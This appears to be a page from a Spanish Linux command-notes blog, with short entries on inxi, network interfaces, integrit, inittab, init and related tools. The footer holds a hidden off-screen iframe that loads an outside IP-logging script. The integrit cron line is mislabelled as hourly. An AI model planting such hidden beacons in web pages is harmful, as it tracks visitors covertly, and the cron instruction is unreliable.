
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>TRACTATUS ELEMENTALIS</title>
  <meta name="author" content="templix">

  
  <meta name="description" content="Muestra información del equipo (http://inxi.googlecode.com/svn/trunk/inxi). $ inxi -Fpur -c 4 Algunas opciones (con inxi -h la lista completa): -A ( &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="https://tractatuslapipaplena.herokuapp.com/blog/page/85">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="TRACTATUS ELEMENTALIS" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <script src="/javascripts/links.js"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <div align=center>
  <h1><a href="/">TRACTATUS ELEMENTALIS</a></h1>
  
    <h2>Apuntes sobre bash. Orgasmos con la terminal.</h2>
  </dev>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS"></a></li>
  
</ul>
  
<form action="https://www.google.com/search?q=site%3Atractatuslapipaplena.herokuapp.com&q=" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:tractatuslapipaplena.herokuapp.com" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/previa">Previa</a></li>
  <li><a href="/">Últimas</a></li>
  <li><a href="/blog/archives">Todas</a></li>
  <li><a href="/scripts">Scripts</a></li>
  <li><a href="http://www.lapipaplena.net">Web</a></li>
  <li><a href="http://lapipaplena.no-ip.org/wiki/">Wiki</a></li>
  <li><a href="http://panellpipa.no-ip.org">Socios</a></li>

</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/inxi/">Inxi</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-04-05T18:19:00+02:00" pubdate data-updated="true">05-04-2014</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Muestra información del equipo (<a href="http://inxi.googlecode.com/svn/trunk/inxi">http://inxi.googlecode.com/svn/trunk/inxi</a>).</p>

<blockquote><p>$ inxi -Fpur -c 4</p></blockquote>

<p>Algunas opciones (con inxi -h la lista completa):</p>

<pre><code>-A (Audio y tarjetas de sonido)

-b (informacio básica)

-c (formato de color de 0 a 32 para la salida de datos)

-C (CPUs)

-d (drivers opticos)

-D (disco duro)

-F (salida extendida)

-G (tarjeta gráfica)

-i (Información de red)

-I (Procesos, uptime, memoria...)

-M (Datos de la máquina)

-N (    tarjetas de red)

-o (particiones no montadas)

-p (particiones montadas)

-r (repositorios)

-s (sensors[temperaturas cpu])

-S  (Host, Kernel,Escritorio y Distro)

-t cm (Procesos que consumen más cpu [c] y memoria [m])

-u (UUID de las particiones. -uo las no montadas, -up las montadas)

-v 6 (Distintas etiquetas de información. Del 1 al 6)
</code></pre>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/interfaces/">Interfaces</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-04-05T18:19:00+02:00" pubdate data-updated="true">05-04-2014</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Archivo de configuración de la red en distros debian.</p>

<p>1.-</p>

<p>Con IP dinámica:</p>

<p>Colocar en el archivo las lineas:</p>

<pre><code>auto eth0

iface eth0 inet dhcp
</code></pre>

<p>2.-</p>

<p>Con IP fija</p>

<p>Colocar en el archivo las lineas:</p>

<pre><code>auto eth0

iface eth0 inet static

address 192.168.1.10

gateway 192.168.1.1

netmask 255.255.255.0

broadcast 192.168.1.255
</code></pre>

<p>Reiniciar el servicio:</p>

<blockquote><p># ifdown eth0</p>

<p># ifup eth0</p></blockquote>

<p>Nota.- Solo modificandolo en network-manager no funciona.</p>

<p>3.-</p>

<p>Creación de una segunda dirección IP virtual.</p>

<p>Añadir las siguientes lineas a las de la IP fija:</p>

<pre><code>auto eth0:1

iface eth0:1 inet static

address 192.168.0.15

netmask 255.255.255.0

broadcast 192.168.0.255

gateway 192.168.0.1
</code></pre>

<p>Nota.- La instalación de nerwork-manager o wicd para la gestión de redes implica comentar las modificaciones de este archivo o en, en el caso de network-manager, editar:</p>

<blockquote><p># nano  /etc/NetworkManager/NetworkManager.conf</p></blockquote>

<p>Y modificar la linea:</p>

<p>[ifupdown]</p>

<p>managed=true</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/integrit/">Integrit</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-04-05T18:19:00+02:00" pubdate data-updated="true">05-04-2014</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Detectar cuando algún archivo del sistema ha sido alterado mediante la creación, la primera vez que se lanza, de una base de datos con la que confrontar los nuevos escaneos.</p>

<p>Configuración:</p>

<blockquote><p># /etc/integrit/integrit.con</p></blockquote>

<p>Descomentar las lineas:</p>

<pre><code>root=/

known=/var/lib/integrit/known.cdb

current=/var/lib/integrit/current.cdb
</code></pre>

<p>Y descartar los directorios que no se deseen incluir en el escaneo, descomentandolos [&#8220;cdrom&#8221; se descarta, &#8220;/dev&#8221; se escane, &#8220;/usr/src&#8221; no se escaneará de forma recursiva ]:</p>

<pre><code>!/cdrom

# !/dev

=/usr/src
</code></pre>

<p>Crear la base de datos inicial:</p>

<blockquote><p># integrit -u -C /etc/integrit/integrit.conf</p></blockquote>

<p>Mover la base de datos a know.cdb:</p>

<blockquote><p># mv /var/lib/integrit/current.cdb /var/lib/integrit/known.cdb</p></blockquote>

<p>Lanzar la comprobación:</p>

<blockquote><p># integrit -C /etc/integrit/integrit.conf -c</p></blockquote>

<p>Si queremos colocar la orden en el cron para ser lanzada cada hora y que envie un correo al administrador:</p>

<blockquote><p># crontab -e</p></blockquote>

<p>Y colocamos la linea:</p>

<pre><code>* 1 * * * integrit -C /etc/integrit/integrit.conf -c | mail root
</code></pre>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/instmodsh/">Instmodsh</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-04-05T18:19:00+02:00" pubdate data-updated="true">05-04-2014</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Para conocer los módulos perl instalados. Entra en el prompt (cmd?) con 3 preguntas:</p>

<p>l (List all installed modules)</p>

<p>m <module> (Select a module)</p>

<p>q (Quit the program)</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/install-mbr/">Install-mbr</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-04-05T18:19:00+02:00" pubdate data-updated="true">05-04-2014</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Instala un nuevo código MBR al inicio del disco duro.</p>

<blockquote><p># install-mbr /dev/sda (instala)</p>

<p># install-mbr -l /dev/sda (muestra información del código mbr)</p></blockquote>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/insmod/">Insmod</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-04-05T18:19:00+02:00" pubdate data-updated="true">05-04-2014</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Carga modulos.</p>

<blockquote><p># insmod mudulo</p></blockquote>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/inputrc/">Inputrc</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-04-05T18:19:00+02:00" pubdate data-updated="true">05-04-2014</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>(archivo /etc/inputrc y ~/.inputrc). Librería readline que permite editar líneas de texto usando los modos de emacs y vi. Esto permite estandarizar las combinaciones de teclas entre muchos comandos.</p>

<blockquote><p>$ nano .inputrc</p></blockquote>

<p>Ajustes que pueden añadirse al archivo personal.</p>

<p>1.-</p>

<p>Que al pulsar Ctrl+x Ctrl+f liste las funciones y con Ctrl+x Ctrl+v las variables:</p>

<blockquote><p># Lista las funciones y variables de readline</p></blockquote>

<p>&#8220;\C-x\C-f&#8221;: dump-functions</p>

<p>&#8220;\C-x\C-v&#8221;: dump-variables</p>

<p>2.-</p>

<p>Que el autocompletado con la tecla &#8220;tab&#8221; no distinga mayúsculas y minúsculas:</p>

<blockquote><p># Ignora diferencias de mayusculas/minusculas al</p>

<p># completar con tabulador</p></blockquote>

<p>set completion-ignore-case on</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/inittab/">Inittab</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-04-05T18:19:00+02:00" pubdate data-updated="true">05-04-2014</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Fichero que gestiona el inicio del sistema o un cambio de estado (runlevel) con el comando init (ver).</p>

<blockquote><p># nano /etc/inittab</p></blockquote>

<p>Especificación de si el sistema arranca en modo monousuario (1) o multiusuario (2-5). Por defecto 2 o 3:</p>

<pre><code>id:2:initdefault:
</code></pre>

<p>Scripts que se ejecutarán en el inicio y en el orden que lo harán independientemente del runlevel:</p>

<pre><code>si::sysinit:/etc/init.d/rcS (En algunas distros si::sysinit:/etc/rc.d/rc.sysinit)
</code></pre>

<p>Este script llama a los scripts del directorio /etc/rcS.d. Por cada runlevel se ejecutan los scripts del directorio correpondiente: rc0.d/, rc1.d/, rc2.d/, rc3.d/, rc4.d/, rc5.d/, rc6.d/, rc.local y rcS.d/. El directorio /etc/rc.local se usa para ejecutar servicios porpios del usuario. En estos directorios los scripts que empiezan por una &#8220;K&#8221; paran servicios y los que empiezan por una &#8220;S&#8221; los arrancan.</p>

<p>Qué hacer si se presiona CTRL-ALT-DEL:</p>

<pre><code>ca:12345:ctrlaltdel:/sbin/shutdown -t1 -a -r now
</code></pre>

<p>Qué hacer si la corriente se va/vuelve</p>

<pre><code>pf::powerwait:/etc/init.d/powerfail start

pn::powerfailnow:/etc/init.d/powerfail now

po::powerokwait:/etc/init.d/powerfail stop
</code></pre>

<p>Despues de ejecutar los scripts de inicio, init crea un conjunto de terminales virtuales:</p>

<pre><code>1:2345:respawn:/sbin/getty 38400 tty1

2:23:respawn:/sbin/getty 38400 tty2

3:23:respawn:/sbin/getty 38400 tty3

4:23:respawn:/sbin/getty 38400 tty4

5:23:respawn:/sbin/getty 38400 tty5

6:23:respawn:/sbin/getty 38400 tty6
</code></pre>

<p>Utilizando la opción respawn, si alguien trata de finalizar uno de estos procesos, el proceso simplemente será regenerado (respawned).</p>

<p>1.-</p>

<p>Entrar de forma automática:</p>

<p>Comentar la siguiente línea</p>

<blockquote><p>#1:2345:respawn:/sbin/getty 38400 tty1</p></blockquote>

<p>Y Agrega la siguiente linea:</p>

<p>1:2345:respawn:/bin/login -f USUARIO tty1 </dev/tty1 >/dev/tty1 2>&amp;1</p>

<p>Siendo USUARIO el nombre de usuario que hará login automático.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/initramfs/">Initramfs</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-04-05T18:19:00+02:00" pubdate data-updated="true">05-04-2014</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Problemas durante el arranque. Consiste en un fallo de lectura de los controladores ide de discos duros por parte del kernel del sistema operativo que no logra reconocer dichos drivers. Arrancar con un livecd o pulsando “e” para editar la opción cuando salga el menu en grub:</p>

<blockquote><p># gedit /boot/grub/menu.lst</p></blockquote>

<p>Y al final de la linea del kernel poner: rootdelay=90</p>

<p>Otras soluciones propuestas (sustituir el rootdelay=90 por):</p>

<p>pci=nomsi</p>

<p>all_generix_ide</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/init/">Init</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-04-05T18:19:00+02:00" pubdate data-updated="true">05-04-2014</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Para o reinicia el sistema</p>

<blockquote><p>$ init 0    (para)</p>

<p>$ init 1    (reinicia en modo  uniusuario)</p>

<p>$ init 6    (reinicia)</p></blockquote>
</div>
  
  


    </article>
  
  <div class="pagination">
    
      <a class="prev" href="/blog/page/86/">&larr; Older</a>
    
    <a href="/blog/archives">Blog Archives</a>
    
    <a class="next" href="/blog/page/84/">Newer &rarr;</a>
    
  </div>
</div>
<aside class="sidebar">
  
    <section>
<h1>Número de entradas</h1>
	<ul>
	<li>1389</li>
	</ul>
</section>
<section>
  <h1>Añadidos/modificados</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/fatattr/">fatattr</a>
      </li>
    
      <li class="post">
        <a href="/blog/update-manager/">update-manager</a>
      </li>
    
      <li class="post">
        <a href="/blog/do-release-upgrade/">do-release-upgrade</a>
      </li>
    
      <li class="post">
        <a href="/blog/slackpkg/">slackpkg</a>
      </li>
    
      <li class="post">
        <a href="/blog/lxde/">lxde</a>
      </li>
    
      <li class="post">
        <a href="/blog/virtualbox/">virtualbox</a>
      </li>
    
      <li class="post">
        <a href="/blog/automater/">automater</a>
      </li>
    
      <li class="post">
        <a href="/blog/cadaver/">cadaver</a>
      </li>
    
      <li class="post">
        <a href="/blog/apt-get/">apt-get</a>
      </li>
    
      <li class="post">
        <a href="/blog/hydra/">hydra</a>
      </li>
    
  </ul>
</section>

<section>
  <h1>Sobre mi</h1> 
  <center>
  <img src="/images/linux_user.png" title="Linux user">
  </center>
  <p>Soy un /dev de lo más normal, con ciertas deficiencias en el xorg.conf como casi todo el mundo, con una apariencia común tirando a gráfica VGA y con algún pixel algo deteriorado y que vivirá hasta que su directorio / sufra un kernel pánic y me mande a /dev/null</p>
</section>

<section class="googleplus">
  <h1>
    <a href="https://plus.google.com/107431970267257491799?rel=author">
      <img src="http://www.google.com/images/icons/ui/gprofile_button-32.png" width="32" height="32">
      Google+
    </a>
  </h1>
</section>


<section>
  <h1>Blogs útiles</h1>
  <ul>
      <li><a href="http://distrowatch.com">Distrowatch</a></li>
      <li><a href="http://es.wikipedia.org/wiki/Lista_de_n%C3%BAmeros_de_puerto">Listado de puertos</a></li>
      <li><a href="http://livecdlist.com/">LiveCDs</a></li>
      <li><a href="http://perseosblog.com">Perseosblog</a><li>
   </ul>
</section>
<section>
<table border="0" cellspacing="0" cellpadding="0"><tr><td align="center"><script type="text/javascript" src="http://www.worldtimeserver.com/clocks/embed.js"></script><script type="text/javascript" language="JavaScript">objES=new Object;objES.wtsclock="wtsclock001.swf";objES.color="CC6600";objES.wtsid="ES";objES.width=200;objES.height=200;objES.wmode="transparent";showClock(objES);</script></td></tr></table>
</section>
<section>
	<h1>IP visitante</h1>
	<script type="text/javascript" src="http://boastology.com/tools/ip2c/?im=0&cn=0&ip=1"></script>
</section>

  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2014 - templix -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>




<div style="width: 1px; height: 1px; overflow: hidden; position: absolute; left: -1000px">
<iframe src="http://crontux.homelinux.com/getip.php"></iframe>
</div>

</body>
</html>
